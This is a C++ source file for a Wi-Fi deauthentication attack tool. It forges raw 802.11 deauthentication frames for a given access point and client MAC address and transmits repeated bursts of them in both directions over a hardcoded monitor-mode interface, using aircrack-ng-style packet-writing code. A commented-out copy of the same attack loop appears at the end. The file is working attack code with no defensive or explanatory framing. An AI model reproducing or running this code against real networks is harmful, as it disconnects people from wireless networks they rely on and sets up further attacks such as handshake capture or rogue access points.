#include <Deauth.h>

#include <wif.h>
#include <pcap.h>

#include <iostream>

#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <cassert>


#include <sys/types.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>

#define DEAUTH_REQ "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

static void print(uint8_t const * in) {
  for (int i = 0; i != 5; ++i)
    printf("%02x:", in[i]);
  printf("%02x", in[5]);
}
static inline int send_packet(struct wif * wi, void * buf, size_t count);

Deauth::Deauth(uint8_t const * bssid_in, char const * iface_in)
  : iface{iface_in} {
  memcpy(bssid, bssid_in, 6);
}

int Deauth::SendPacket(uint8_t const * stmac_in) {
  assert(stmac_in);

  pid_t pid = fork();
  if (!pid) {
    // char i[65];
    uint8_t st[6];
    uint8_t bs[6];
    memcpy(st, stmac_in, 6);
    memcpy(bs, bssid, 6);
    sendP("wlan0mon", bs, st);
    exit(0);
  }
  waitpid(pid, NULL, 0);

  return 0;
}

void sendP(char const * iface, uint8_t const * bssid_in, uint8_t const * stmac_in) {
  assert(stmac_in);

  print(stmac_in); std::cout << "  -- Sending deauth packets\n";

  wif *wi = wi_open(iface);
  if (!wi) {
    perror("wi:");
    return;
  }

	/* drop privileges */
	if (setuid(getuid()) == -1)
		perror("setuid");
  uint8_t h80211[4096] {0};
  for (int i = 0; i != 2; ++i) {
    usleep(180000);

    /* deauthenticate the target */
    memcpy(h80211, DEAUTH_REQ, 26);
    memcpy(h80211 + 16, bssid_in, 6);

    /* add the deauth reason code */
    h80211[24] = 7;

    for (int j = 0; j != 32; ++j) {

      memcpy(h80211 + 4, stmac_in, 6);
      memcpy(h80211 + 10, bssid_in, 6);

      if (send_packet(wi, h80211, 26) < 0)
        return ;

      usleep(2000);

      memcpy(h80211 + 4, bssid_in, 6);
      memcpy(h80211 + 10, stmac_in, 6);

      if (send_packet(wi, h80211, 26) < 0)
        return ;

      usleep(2000);
    }
  }

}

static inline int send_packet(struct wif * wi, void * buf, size_t count) {
	static int nb_pkt_sent = 0;

	uint8_t * pkt = (uint8_t *) buf;

	if ((count > 24)
		&& (pkt[1] & 0x04) == 0
		&& (pkt[22] & 0x0F) == 0)
	{
		pkt[22] = (uint8_t)((nb_pkt_sent & 0x0000000F) << 4);
		pkt[23] = (uint8_t)((nb_pkt_sent & 0x00000FF0) >> 4);
	}

	int rc;
	do
	{
		rc = wi->wi_write(wi, NULL, LINKTYPE_IEEE802_11, (unsigned char*)buf, (int) count, NULL);
		if (rc == -1 && errno == ENOBUFS)
		{
			usleep(10000);
		}
	} while (rc == -1 && (errno == EAGAIN || errno == ENOBUFS));

	if (rc == -1)
	{
		perror("wi_write()");
		return (-1);
	}

	++nb_pkt_sent;

	return (0);
}

// int Deauth::do_attack_deauth(wif * wi) {
//   for (int i = 0; i != 2; ++i) {

// 		usleep(180000);

//     /* deauthenticate the target */
//     memcpy(h80211, DEAUTH_REQ, 26);
//     memcpy(h80211 + 16, bssid, 6);

//     /* add the deauth reason code */
//     h80211[24] = 7;

//     for (int j = 0; j != 32; ++j) {

//       memcpy(h80211 + 4, stmac, 6);
//       memcpy(h80211 + 10, bssid, 6);

//       if (send_packet(wi, h80211, 26) < 0)
//         return 1;

//       usleep(2000);

//       memcpy(h80211 + 4, bssid, 6);
//       memcpy(h80211 + 10, stmac, 6);

//       if (send_packet(wi, h80211, 26) < 0)
//         return 1;

//       usleep(2000);
//     }
//   }
// 	return 0;
// }

